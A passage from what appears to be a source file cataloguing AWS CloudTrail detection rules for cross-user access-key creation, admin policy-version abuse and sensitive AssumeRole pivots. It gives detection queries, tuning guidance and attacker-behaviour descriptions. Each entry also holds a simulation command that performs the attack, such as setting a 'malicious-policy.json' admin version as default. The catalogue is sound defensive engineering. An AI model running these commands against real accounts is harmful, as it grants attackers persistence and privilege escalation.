            "access_key_id": detail.get("responseElements", {}).get("accessKey", {}).get("accessKeyId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["iam-backdoor-policies"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.userName", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { userName: "victim-user" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the access key and for which user.", "Verify if the target user differs from the caller (backdoor indicator).", "Review recent activity of both identities.", "Check if the key creation was part of onboarding."],
    testingSteps: ["As user A, create an access key for user B.", "Verify CloudTrail captures CreateAccessKey.", "Run the detection to confirm it triggers on cross-user key creation."],
    lifecycle: {
      whyItMatters: "Creating an access key for another IAM user can establish durable, API-usable credentials without changing trust policies or role assumptions. It is a strong persistence and credential-abuse signal when it is clearly distinguished from a user legitimately creating a key for themselves.",
      threatContext: {
        attackerBehavior: "An attacker with iam:CreateAccessKey can generate a new long-lived credential for an existing IAM user, often choosing a dormant, service, or higher-privilege account to avoid immediate detection. This gives the attacker a reusable access path that survives browser sessions and can be used from external tooling, automation, or remote infrastructure.",
        realWorldUsage: "Long-lived access key creation is a common persistence pattern in AWS intrusion and red-team scenarios because it turns a transient foothold into reusable credentials. Cross-user key creation is particularly sensitive because it indicates the caller is provisioning credentials for a different identity.",
        whyItMatters: "The important engineering distinction is not every CreateAccessKey event, but whether the request explicitly targets another user. AWS allows callers to create a key for themselves without specifying UserName, so a production rule must separate self-key creation from cross-user creation.",
        riskAndImpact: "If this behavior goes undetected, an attacker can create durable credentials for a privileged or forgotten account, bypass short-lived session controls, establish persistence, and enable later exfiltration, privilege escalation, or security-control tampering from infrastructure outside AWS.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for IAM)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.userName", "userIdentity.principalId", "userIdentity.sessionContext.sessionIssuer.userName", "requestParameters.userName", "responseElements.accessKey.accessKeyId", "sourceIPAddress", "eventTime", "recipientAccountId"],
        loggingRequirements: ["CloudTrail management events must be enabled for IAM API activity.", "The pipeline must preserve requestParameters.userName exactly as emitted, including the case where it is absent.", "Detections must treat missing requestParameters.userName as a different case from explicit cross-user key creation.", "For IAMUser callers, the rule should compare requestParameters.userName to userIdentity.userName, not to userIdentity.arn."],
        limitations: ["Self-service CreateAccessKey requests may omit requestParameters.userName entirely, so a naive inequality test can create false positives or null-handling bugs.", "userIdentity.userName is reliably present for IAMUser callers, but non-IAMUser callers such as AssumedRole require different handling because their top-level identity is not an IAM user friendly name.", "Comparing requestParameters.userName to userIdentity.arn is incorrect because ARNs include service prefix, account ID, resource type, and may include IAM paths."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "IAM API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "CreateAccessKey API" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail event time" },
          { rawPath: "userIdentity.type", normalizedPath: "user.type", notes: "Caller identity type" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller ARN; do not compare directly to target userName" },
          { rawPath: "userIdentity.userName", normalizedPath: "user.name", notes: "Friendly caller user name when caller type is IAMUser" },
          { rawPath: "requestParameters.userName", normalizedPath: "aws.iam.target_user.name", notes: "IAM user receiving the new access key; absent for some self-service flows" },
          { rawPath: "responseElements.accessKey.accessKeyId", normalizedPath: "aws.iam.access_key.id", notes: "Identifier of the created key" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["creation"], action: "CreateAccessKey", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/attacker", name: "attacker", type: "IAMUser", id: "AIDAATTACKER" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" } },
          aws: { iam: { target_user: { name: "victim-user" }, access_key: { id: "AKIAEXAMPLE" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Caller Identity Context", description: "Identify whether the caller is an IAM user, assumed role, break-glass role, automation pipeline, or root.", examples: ["IAMUser attacker", "Assumed role identity-admin-prod", "Break-glass admin role", "Terraform provisioning role"], falsePositiveReduction: "Separates suspicious cross-user provisioning from approved administrative flows and prevents bad comparisons across identity types." },
        { dimension: "Target User Metadata", description: "Enrich the user receiving the new key with privilege level, owner, last login, MFA status, path, and whether the account is human, service, dormant, or deprecated.", examples: ["Dormant finance-admin IAM user", "Legacy CI service user", "Break-glass responder account"], falsePositiveReduction: "Improves prioritization and reduces noise from expected service-account provisioning." },
        { dimension: "Access Key Hygiene and Baseline", description: "Track whether the target user already has existing keys, whether the new key exceeds normal rotation patterns, and whether the target user historically creates their own keys or never has.", examples: ["User had zero prior access keys", "Second active key created outside rotation window", "Target user never previously used API credentials"], falsePositiveReduction: "Distinguishes expected rotation from unusual creation patterns that suggest persistence." },
        { dimension: "Approval and Automation Context", description: "Correlate with change windows, ticket IDs, provisioning pipelines, and known onboarding workflows.", examples: ["Onboarding job ID", "Identity governance ticket", "CI pipeline run metadata"], falsePositiveReduction: "Allows known key-provisioning workflows to be suppressed without weakening the core cross-user detection." },
      ],
      logicExplanation: {
        humanReadable: "This detection should focus on explicit cross-user key creation, not all CreateAccessKey events. AWS allows a caller to create a key for themselves without specifying UserName, so the rule should first check whether requestParameters.userName is actually present. When the caller is an IAM user, compare requestParameters.userName to userIdentity.userName, because both are friendly names in the same namespace; do not compare requestParameters.userName to userIdentity.arn, which is a different identifier format. For non-IAMUser callers such as assumed roles, an explicit target userName usually means the caller is provisioning a key for another user and should be evaluated against an allowlist of approved admin and automation identities.",
        conditions: ["eventSource equals iam.amazonaws.com", "eventName equals CreateAccessKey", "requestParameters.userName exists and is not empty", "either userIdentity.type equals IAMUser and userIdentity.userName does not equal requestParameters.userName", "or userIdentity.type is not IAMUser and the explicit requestParameters.userName indicates a key is being created for a named IAM user", "actor is not in an approved key-provisioning allowlist"],
        tuningGuidance: "1. Add an explicit existence check for requestParameters.userName before any comparison. 2. For IAMUser callers, compare requestParameters.userName to userIdentity.userName, not userIdentity.arn. 3. For AssumedRole or other non-IAMUser callers, treat explicit target userName as cross-user provisioning and allowlist only tightly controlled admin workflows. 4. Prioritize alerts where the target user is privileged, dormant, or normally has no access keys.",
        whenToFire: "Fire whenever CreateAccessKey explicitly names a target IAM user that is different from the calling IAM user, or when any non-IAMUser principal creates a key for a named user outside approved provisioning workflows. In mature environments this should be a very low-volume, high-value alert.",
      },
      simulationCommand: "aws iam create-access-key --user-name victim-user",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium-Low (mostly central admin or onboarding workflows after explicit actor allowlisting)",
        expectedVolume: "Very low in mature environments; generally sporadic",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "CloudWatch Logs Insights", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes in Athena or SIEM; Real-time: EventBridge on CreateAccessKey with lightweight identity-context enrichment.",
        considerations: ["Do not implement the rule as userIdentity.arn != requestParameters.userName.", "Guard for missing requestParameters.userName before comparing values.", "Handle IAMUser and AssumedRole callers separately because their identity fields differ.", "Pair with detections for DeleteAccessKey, UpdateAccessKey, and anomalous subsequent API use by the new key for stronger investigation context."],
      },
    },
  },
  {
    id: "det-011",
    title: "IAM Policy Version Created with Full Admin",
    description: "Detects creation of a new policy version granting full administrative access (Action: *, Resource: *).",
    awsService: "IAM",
    relatedServices: [],
    severity: "Critical",
    tags: ["IAM", "Privilege Escalation", "Policy"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate policy updates by trusted admins"],
    rules: {
      sigma: `title: IAM Policy Version with Admin Access
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: iam.amazonaws.com
    eventName: CreatePolicyVersion
    requestParameters.setAsDefault: true
  admin_doc:
    requestParameters.policyDocument|contains:
      - '"Action":"*"'
      - '"Resource":"*"'
  condition: selection and admin_doc
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=CreatePolicyVersion
| where requestParameters.setAsDefault=true
| where like(requestParameters.policyDocument, "%\\"Action\\":\\"*\\"%") AND like(requestParameters.policyDocument, "%\\"Resource\\":\\"*\\"%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.policyArn, requestParameters.setAsDefault, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.policyArn, requestParameters.setAsDefault, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName = 'CreatePolicyVersion'
  AND requestParameters.setAsDefault = true
  AND requestParameters.policyDocument LIKE '%"Action":"*"%'
  AND requestParameters.policyDocument LIKE '%"Resource":"*"%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.policyArn, requestParameters.setAsDefault, sourceIPAddress
| filter eventSource = "iam.amazonaws.com"
| filter eventName = "CreatePolicyVersion"
| filter requestParameters.setAsDefault = true
| filter requestParameters.policyDocument like /"Action":"\*"/ and requestParameters.policyDocument like /"Resource":"\*"/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["iam.amazonaws.com"], eventName: ["CreatePolicyVersion"] } }, null, 2),
      lambda: `"""
IAM Policy Version Created with Full Admin
Trigger: EventBridge rule matching CloudTrail CreatePolicyVersion events.
Use for: Real-time alerting when a managed policy is updated to broad admin permissions.
"""

import json

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "iam.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "CreatePolicyVersion":
        return {"matched": False}

    request = detail.get("requestParameters", {})
    policy_document = request.get("policyDocument", "")
    set_as_default = request.get("setAsDefault", False)

    if not set_as_default:
        return {"matched": False}
    if '"Action":"*"' not in policy_document or '"Resource":"*"' not in policy_document:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-011",
            "title": "IAM Policy Version Created with Full Admin",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "policy_arn": request.get("policyArn"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: ["create-policy-version-abuse", "iam-privilege-escalation"],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.policyArn", "requestParameters.policyDocument", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreatePolicyVersion", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { policyArn: "arn:aws:iam::123456789012:policy/ExistingPolicy", policyDocument: '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who created the policy version.", "Inspect the new policy document for Action:* and Resource:*.", "Verify whether the identity was attached to the policy.", "Review recent privilege escalation activity."],
    testingSteps: ["Attach a policy to your user, then create a new version with admin permissions.", "Set it as default.", "Run the detection query to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "CreatePolicyVersion is one of the cleanest IAM privilege escalation paths in AWS because the attacker can modify a policy they already inherit and instantly turn their existing attachment into admin access.",
      threatContext: {
        attackerBehavior: "An attacker with iam:CreatePolicyVersion on a managed policy can upload a new, more permissive version of that policy. If they set the new version as default, every principal attached to that policy immediately receives the broadened permissions without any further API calls.",
        realWorldUsage: "This path is widely documented in AWS privilege escalation research and is a staple of red-team tradecraft because it is reliable, low-noise, and often overlooked in environments that focus only on AttachUserPolicy or PutUserPolicy. Public IAM escalation references also note that set-as-default behavior can collapse a policy update and privilege change into one step.",
        whyItMatters: "Unlike some IAM changes, this technique modifies an existing trust surface rather than creating a new principal. That makes it easy to hide inside routine policy management unless the policy document is inspected.",
        riskAndImpact: "A successful admin policy version can grant full account takeover, access to sensitive data, key-management actions, persistence through new identities or roles, and the ability to disable or tamper with security controls.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for IAM)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.policyArn", "requestParameters.policyDocument", "requestParameters.setAsDefault", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail management events must include IAM API activity", "The ingestion pipeline must retain the full policyDocument string from requestParameters", "For exact content matching, downstream tools may need JSON parsing or string matching on escaped JSON"],
        limitations: ["Not every dangerous policy version contains literal Action:* and Resource:*; attackers may use narrower but still high-risk permissions", "If the attacker creates a non-default version first and later calls SetDefaultPolicyVersion, a separate rule is needed", "Whitespace or formatting changes in policyDocument can affect naive string matching in some tools"],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "IAM API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "CreatePolicyVersion API" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing the policy change" },
          { rawPath: "requestParameters.policyArn", normalizedPath: "aws.iam.policy.arn", notes: "Target managed policy" },
          { rawPath: "requestParameters.setAsDefault", normalizedPath: "aws.iam.policy.set_as_default", notes: "Whether the new version becomes effective immediately" },
          { rawPath: "requestParameters.policyDocument", normalizedPath: "aws.iam.policy.document", notes: "New policy version content" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "CreatePolicyVersion", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" } },
          aws: {
            iam: {
              policy: {
                arn: "arn:aws:iam::123456789012:policy/ExistingPolicy",
                set_as_default: true,
                document: { Statement: [{ Effect: "Allow", Action: "*", Resource: "*" }] },
              },
            },
          },
        }, null, 2),
      },
      enrichment: [
        {
          dimension: "Policy Attachment Blast Radius",
          description: "Determine which users, groups, and roles are attached to the modified policy to understand how many principals inherited the new privileges.",
          examples: ["ListEntitiesForPolicy output", "Attached production role count", "High-value role attachments"],
          falsePositiveReduction: "Distinguishes routine niche-policy edits from changes that instantly expand access across many principals.",
        },
        {
          dimension: "Policy Document Diff",
          description: "Compare the prior default version to the new version to highlight exactly which actions, resources, or conditions changed.",
          examples: ["Old version v2 vs new version v3", "Added iam:*", "Removed Condition blocks"],
          falsePositiveReduction: "Helps separate harmless maintenance edits from materially dangerous privilege expansion.",
        },
        {
          dimension: "Actor Privilege and Ownership Context",
          description: "Enrich with whether the actor is an IAM admin, platform role, break-glass account, or unexpected identity modifying sensitive policies.",
          examples: ["AWSReservedSSO_AdministratorAccess", "Terraform runner", "Developer workstation principal"],
          falsePositiveReduction: "Filters expected policy management by trusted administrators while escalating changes from non-admin identities.",
        },
        {
          dimension: "Target Policy Criticality",
          description: "Classify the policy by attached resources, environment, and whether it is used in production, security tooling, CI/CD, or break-glass access.",
          examples: ["Policy attached to OrganizationAccountAccessRole", "Production deployment role", "Security response role"],
          falsePositiveReduction: "Prioritizes high-impact modifications and reduces noise from low-risk development policies.",
        },
      ],
      logicExplanation: {
        humanReadable: "This detection identifies CreatePolicyVersion requests that both introduce an obviously over-permissive policy document and set the new version as the default version immediately. That combination is important: CreatePolicyVersion alone is not necessarily malicious, but a default version containing Action:* and Resource:* turns a routine policy-management API into immediate privilege escalation. The rule is designed to emphasize impact over volume by focusing on full-admin style payloads instead of alerting on every policy version creation. In production, pair this rule with policy-diff enrichment and a separate detector for SetDefaultPolicyVersion so you can catch both one-step and two-step policy-version abuse.",
        conditions: [
          "eventSource equals iam.amazonaws.com",
          "eventName equals CreatePolicyVersion",
          "requestParameters.setAsDefault equals true",
          "requestParameters.policyDocument contains both Action:* and Resource:*",
        ],
        tuningGuidance: "1. Add allowlists for approved IAM administrators and automation roles that manage policies. 2. Extend the content match beyond Action:* and Resource:* to include narrower but still dangerous actions such as iam:PassRole, sts:AssumeRole, kms:Decrypt, secretsmanager:GetSecretValue, and s3:GetObject. 3. Use policy-diff enrichment so the detector can score how much privilege was added rather than relying only on static string checks.",
        whenToFire: "Fire on every CreatePolicyVersion event that creates an immediately effective admin-style document. In most organizations this should be extremely low volume and high priority, especially when the target policy is attached to active users or roles.",
      },
      simulationCommand: "aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/DevPolicy --policy-document file://malicious-policy.json --set-as-default",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low (legitimate full-admin policy versioning should be rare and tightly controlled)",
        expectedVolume: "Very low; typically single digits per month or lower",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes; Real-time: EventBridge on CreatePolicyVersion",
        considerations: ["Use a separate rule for SetDefaultPolicyVersion rollback or delayed activation patterns", "Policy document parsing quality varies by SIEM and may require JSON extraction or raw-string matching", "Blast-radius enrichment is critical for incident prioritization"],
      },
    },
  },
  {
    id: "det-130",
    title: "STS AssumeRole into Sensitive Role by Unexpected Principal",
    description: "Detects AssumeRole activity targeting sensitive roles when the caller is outside expected admin, platform, or automation identities.",
    awsService: "STS",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["STS", "AssumeRole", "Lateral Movement", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Expected cross-account administration", "Approved federated admin access", "Break-glass or incident-response role assumptions"],
    rules: {
      sigma: `title: STS AssumeRole into Sensitive Role by Unexpected Principal
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: sts.amazonaws.com
    eventName: AssumeRole
  target_role:
    requestParameters.roleArn|contains:
      - 'Admin'
      - 'Administrator'
      - 'PowerUser'
      - 'OrganizationAccountAccessRole'
      - 'Security'
  filter_known_admin:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Security'
      - '/role/Platform'
      - '/role/Infra'
      - 'AWSReservedSSO_AdministratorAccess'
  condition: selection and target_role and not filter_known_admin
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=sts.amazonaws.com eventName=AssumeRole
| where like(requestParameters.roleArn, "%Admin%") OR like(requestParameters.roleArn, "%Administrator%") OR like(requestParameters.roleArn, "%PowerUser%") OR like(requestParameters.roleArn, "%OrganizationAccountAccessRole%") OR like(requestParameters.roleArn, "%Security%")
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Security%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Infra%") OR like(userIdentity.arn, "%AWSReservedSSO_AdministratorAccess%"))
| table _time, userIdentity.type, userIdentity.arn, requestParameters.roleArn, requestParameters.roleSessionName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.roleArn, requestParameters.roleSessionName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'sts.amazonaws.com'
  AND eventName = 'AssumeRole'
  AND (
    requestParameters.roleArn LIKE '%Admin%'
    OR requestParameters.roleArn LIKE '%Administrator%'
    OR requestParameters.roleArn LIKE '%PowerUser%'
    OR requestParameters.roleArn LIKE '%OrganizationAccountAccessRole%'
    OR requestParameters.roleArn LIKE '%Security%'
  )
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Security%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Infra%'
  AND userIdentity.arn NOT LIKE '%AWSReservedSSO_AdministratorAccess%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.roleArn, requestParameters.roleSessionName, sourceIPAddress
| filter eventSource = "sts.amazonaws.com"
| filter eventName = "AssumeRole"
| filter requestParameters.roleArn like /Admin|Administrator|PowerUser|OrganizationAccountAccessRole|Security/
| filter userIdentity.arn not like /\\/role\\/(Admin|Security|Platform|Infra)/ and userIdentity.arn not like /AWSReservedSSO_AdministratorAccess/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["sts.amazonaws.com"], eventName: ["AssumeRole"] } }, null, 2),
      lambda: `"""
STS AssumeRole into Sensitive Role by Unexpected Principal
Trigger: EventBridge rule matching CloudTrail AssumeRole events.
Use for: Real-time alerting on suspicious role assumption into sensitive roles.
"""

SENSITIVE_ROLE_MARKERS = ("Admin", "Administrator", "PowerUser", "OrganizationAccountAccessRole", "Security")
APPROVED_CALLER_MARKERS = ("/role/Admin", "/role/Security", "/role/Platform", "/role/Infra", "AWSReservedSSO_AdministratorAccess")

def lambda_handler(event, context):
    detail = event.get("detail", {})
    caller = detail.get("userIdentity", {}).get("arn", "")
    role_arn = detail.get("requestParameters", {}).get("roleArn", "")

    if detail.get("eventSource") != "sts.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "AssumeRole":
        return {"matched": False}
    if not any(marker in role_arn for marker in SENSITIVE_ROLE_MARKERS):
        return {"matched": False}
    if any(marker in caller for marker in APPROVED_CALLER_MARKERS):
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-130",
            "title": "STS AssumeRole into Sensitive Role by Unexpected Principal",
            "severity": "Critical",
            "actor": caller,
            "target_role": role_arn,
            "session_name": detail.get("requestParameters", {}).get("roleSessionName"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: {
      primaryLogSource: "AWS CloudTrail",
      generatingService: "sts.amazonaws.com",
      importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.roleArn", "requestParameters.roleSessionName", "sourceIPAddress", "eventTime"],
      exampleEvent: JSON.stringify({
        eventVersion: "1.08",
        eventSource: "sts.amazonaws.com",
        eventName: "AssumeRole",
        userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/compromised-dev" },
        requestParameters: { roleArn: "arn:aws:iam::987654321098:role/CrossAccountAdmin", roleSessionName: "attacker-session" },
        sourceIPAddress: "203.0.113.50",
        eventTime: "2025-02-10T12:45:00Z",
      }, null, 2),
    },
    investigationSteps: [
      "Identify the caller, source IP, and target role ARN.",
      "Validate whether the caller is authorized to assume the target role under normal operations.",
      "Review the target role trust policy, attached permissions, and recent changes.",
      "Look for follow-on sensitive API activity using the assumed role session.",
    ],
    testingSteps: [
      "Use a non-admin test principal that can call sts:AssumeRole on a sensitive role.",
      "Run an AssumeRole command against the target role.",
      "Verify the AssumeRole event appears in CloudTrail with the expected roleArn and roleSessionName.",
      "Run the detection query to confirm the alert fires.",
    ],
    lifecycle: {
      whyItMatters: "AssumeRole is the core temporary-credential primitive for AWS lateral movement. When a non-standard identity assumes a sensitive role, the attacker can pivot into a stronger permission boundary without creating a new principal.",
      threatContext: {
        attackerBehavior: "An attacker with valid AWS credentials and permission to call sts:AssumeRole can pivot into another role if the target role's trust policy allows it. This is a common way to laterally move across accounts, elevate privileges, or transition from an exposed workload role into a more sensitive administrative role.",
        realWorldUsage: "AssumeRole abuse appears frequently in cloud intrusion investigations, especially in cross-account pivoting, trust-policy abuse, and post-compromise privilege escalation. Attackers often combine it with weak trust policies, recently modified roles, or compromised developer and CI identities.",
        whyItMatters: "Role assumption changes the effective permission set immediately and can make the attacker blend into normal AWS temporary-credential patterns if you only monitor long-lived IAM users.",
        riskAndImpact: "Undetected AssumeRole abuse can enable cross-account access, data theft, privilege escalation, persistence through trusted roles, and rapid expansion of attacker reach across production environments.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for STS)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.roleArn", "requestParameters.roleSessionName", "sourceIPAddress", "recipientAccountId", "eventTime"],
        loggingRequirements: ["CloudTrail management events must include STS activity", "Retain sourceIPAddress and userIdentity fields for caller profiling", "Capture recipientAccountId for cross-account analysis"],
        limitations: ["AssumeRole is common in healthy AWS environments, so context is essential", "Role-name heuristics alone are not enough without an authoritative sensitivity inventory", "Federated or SSO-heavy environments require careful allowlisting to avoid analyst fatigue"],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "STS API source" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "AssumeRole API" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller identity" },
          { rawPath: "requestParameters.roleArn", normalizedPath: "aws.sts.target_role.arn", notes: "Role being assumed" },
          { rawPath: "requestParameters.roleSessionName", normalizedPath: "aws.sts.session_name", notes: "Requested STS session name" },
          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Caller network" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["access"], action: "AssumeRole", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/compromised-dev", type: "IAMUser" },
          source: { ip: "203.0.113.50" },
          cloud: { provider: "aws", account: { id: "987654321098" } },
          aws: { sts: { target_role: { arn: "arn:aws:iam::987654321098:role/CrossAccountAdmin" }, session_name: "attacker-session" } },
        }, null, 2),
      },
      enrichment: [
        {
          dimension: "Caller Identity Context",
          description: "Determine whether the caller is a human user, workload role, SSO role, CI pipeline, or break-glass account and whether that identity normally assumes sensitive roles.",
          examples: ["SSO permission set", "Workload role owner", "CI runner tag", "MFA context"],
          falsePositiveReduction: "Separates expected platform/admin assumptions from suspicious pivots by developer or application identities.",
        },
        {
          dimension: "Target Role Sensitivity",
          description: "Classify the assumed role by attached policies, blast radius, account placement, and whether it is considered sensitive or break-glass.",
          examples: ["Role attached to AdministratorAccess", "Security incident role", "Cross-account production role"],
          falsePositiveReduction: "Prioritizes truly dangerous assumptions instead of all role switches.",
        },
        {
          dimension: "Trust Policy and Relationship Context",
          description: "Review whether the caller should be trusted by the target role and whether the trust relationship was changed recently.",
          examples: ["Trust policy updated in last 24h", "ExternalId required", "PrincipalOrgID condition missing"],
          falsePositiveReduction: "Helps validate legitimate cross-account design while exposing weak or newly altered trust paths.",
        },
        {
          dimension: "Network and Session Context",
          description: "Correlate source IP, geolocation, user agent, and session naming patterns to identify novel or suspicious assumptions.",
          examples: ["New country for caller", "CLI userAgent from workstation", "Session name attacker-session", "Outside business hours"],
          falsePositiveReduction: "Raises fidelity when the same API is executed from unusual environments or session patterns.",
        },
      ],
      logicExplanation: {
        humanReadable: "This detection focuses on AssumeRole events that target sensitive roles and are initiated by callers outside the expected admin or platform identity set. The engineering intent is not to alert on every AssumeRole call, which would be noisy in most AWS environments, but rather to identify higher-risk pivots into roles that materially change access. The initial rule uses role-name and caller-name heuristics so it can operate without a full asset inventory, but it is designed to be strengthened with role-sensitivity enrichment and trust-policy context. In production, treat this as a contextual lateral-movement detector rather than a generic STS audit rule.",
        conditions: [
          "eventSource equals sts.amazonaws.com",
          "eventName equals AssumeRole",
          "requestParameters.roleArn indicates a sensitive target role (for example Admin, PowerUser, OrganizationAccountAccessRole, or Security)",
          "userIdentity.arn is not in the approved admin, platform, or automation identity set",
        ],
        tuningGuidance: "1. Replace role-name matching with a maintained inventory of sensitive roles. 2. Maintain explicit allowlists for SSO admin roles, incident-response roles, and approved cross-account automation. 3. Escalate severity when the trust policy changed recently, the source IP is unusual, or follow-on sensitive API calls occur in the assumed session.",
        whenToFire: "Fire when a sensitive role is assumed by a non-standard identity, especially from external workstations, unusual accounts, or unusual networks. In well-tuned environments this should be low-volume and worthy of analyst review because it indicates an important privilege transition.",
      },
      simulationCommand: "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name attacker-session",
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium (requires environment-specific allowlists and sensitive-role inventory)",
        expectedVolume: "Low to moderate, depending on how broadly AssumeRole is used",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena (scheduled query)", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Batch: every 5-15 minutes; Real-time: EventBridge on AssumeRole",
        considerations: ["Trust-policy context dramatically improves triage", "Heuristic role-name matching should eventually be replaced by a sensitive-role inventory", "Correlate with follow-on API usage from the assumed session for higher confidence"],
      },
    },
  },

  // --- Lambda ---
  {
    id: "det-005",
    title: "Lambda Internet Egress to Unapproved or Suspicious Destination",
    description: "Identifies VPC-attached Lambda functions making outbound connections to external destinations that are unapproved, novel, or suspicious for that workload.",
    awsService: "Lambda",
